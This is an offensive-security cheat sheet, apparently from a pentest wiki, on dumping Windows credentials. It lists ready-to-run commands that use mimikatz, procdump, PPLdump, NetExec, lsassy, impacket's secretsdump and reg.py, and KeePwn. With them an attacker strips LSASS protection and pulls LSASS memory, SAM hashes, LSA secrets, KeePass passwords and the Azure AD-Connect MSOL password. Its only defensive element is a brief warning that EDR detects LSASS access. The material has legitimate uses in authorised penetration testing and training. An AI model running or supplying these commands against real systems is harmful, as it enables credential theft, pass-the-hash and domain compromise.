# Credential Dumping

Administrative access to a host is administrative access to the secrets in its memory and registry. LSASS holds logged-on credentials; the SAM holds local hashes; LSA secrets hold service account passwords; a hybrid host holds the Azure AD-Connect credential.

## Why It Works

Windows caches credentials so users and services do not re-authenticate constantly. Those caches — LSASS memory, the SAM and SECURITY hives — are readable by SYSTEM, so local admin converts directly into harvested credentials.

## Prerequisites

* Local administrator or SYSTEM on the target host
* A way past LSASS protection (PPL) if enabled

## Execution

**Extract credentials from LSASS.exe**

* LSASS as protected process
  * `PPLdump64.exe <lsass.exe|lsass_pid> lsass.dmp #before 2022-07-22 update` [\[tool\]](https://github.com/itm4n/PPLdump)
  * `mimikatz "!+" "!processprotect /process:lsass.exe /remove" "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "!processprotect /process:lsass.exe" "!-"` [\[tool\]](https://github.com/gentilkiwi/mimikatz)
* Extract LSASS secrets
  * `procdump.exe -accepteula -ma lsass.exe lsass.dmp` [\[tool\]](https://learn.microsoft.com/fr-fr/sysinternals/downloads/procdump)
  * `mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"` [\[tool\]](https://github.com/gentilkiwi/mimikatz)
    * **→ User + Pass**
    * **→ NTLM**
  * `msf> load kiwi creds_all` [\[tool\]](https://docs.metasploit.com/)
  * `nxc smb <ip_range> -u <user> -p <password> -M lsassy` [\[tool\]](https://github.com/Pennyw0rth/NetExec)
    * **→ PassTheHash**
    * **→ Clear text move**
  * `lsassy -d <domain> -u <user> -p <password> <ip>` [\[tool\]](https://github.com/login-securite/lsassy)

**Extract credentials from SAM**

* `nxc smb <ip_range> -u <user> -p <password> --sam` [\[tool\]](https://github.com/Pennyw0rth/NetExec)
* `msf> hashdump` [\[tool\]](https://docs.metasploit.com/)
* `mimikatz "privilege::debug" "lsadump::sam" "exit"` [\[tool\]](https://github.com/gentilkiwi/mimikatz)
* `secretsdump.py <domain>/<user>:<password>@<ip>` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
  * **→ NTLM**
* `reg save HKLM\SAM <file>; reg save HKLM\SYSTEM <file>` [\[tool\]](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg)
  * `secretsdump.py -system SYSTEM -sam SAM LOCAL` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
    * **→ PassTheHash**
* `reg.py <domain>/<user>:<password>@<ip> backup -o '\\<smb_ip>\share'` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/reg.py)
  * `secretsdump.py -system SYSTEM -sam SAM LOCAL` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
* `regsecrets.py <domain>/<user>:<password>@<ip>` [\[tool\]](https://github.com/fortra/impacket/pull/1898)

**Extract credentials from LSA**

* `nxc smb <ip_range> -u <user> -p <password> --lsa` [\[tool\]](https://github.com/Pennyw0rth/NetExec)
* `mimikatz "privilege::debug" "lsadump::lsa" "exit"` [\[tool\]](https://github.com/gentilkiwi/mimikatz)
* `reg save HKLM\SECURITY <file>; reg save HKLM\SYSTEM <file>` [\[tool\]](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg)
  * `secretsdump.py -system SYSTEM -security SECURITY` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
    * **→ MsCache 2**
    * **→ User + Pass**
* `reg.py <domain>/<user>:<password>@<ip> backup -o '\\<smb_ip>\share'` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/reg.py)

**Misc**

* Find Users
  * `smbmap.py --host-file ./computers.list -u <user> -p <password> -d <domain> -r 'C$\Users' --dir-only --no-write-check --no-update --no-color --csv users_directory.csv` [\[tool\]](https://github.com/ShawnDEvans/smbmap)
    * **→ Username**
* Extract Keepass
  * `KeePwn.py plugin add -u '<user>' -p '<password>' -d '<domain>' -t <target> --plugin KeeFarceRebornPlugin.dll`
    * **→ User + Pass**
  * `KeePwn.py trigger add -u '<user>' -p '<password>' -d '<domain>' -t <target>`
* Hybrid (Azure AD-Connect)
  * Dump cleartext password of MSOL Account on ADConnect Server
    * `azuread_decrypt_msol_v2.ps1` [\[tool\]](https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c)
    * `nxc smb <ip> -u <user> -p <password> -M msol` [\[tool\]](https://github.com/Pennyw0rth/NetExec)
      * **→ DCSYNC**

{% hint style="warning" %}
LSASS access is heavily monitored by EDR. Reading LSASS with a signatured tool is one of the most reliably detected actions on this list.
{% endhint %}

## Related

* [DPAPI Secrets](file:///9685693/host-access/dpapi-secrets.md) — the DPAPI-protected secret store
* [Pass-the-Hash & OverPass-the-Hash](file:///9685693/lateral-movement/pass-the-hash.md) — reusing the dumped hashes
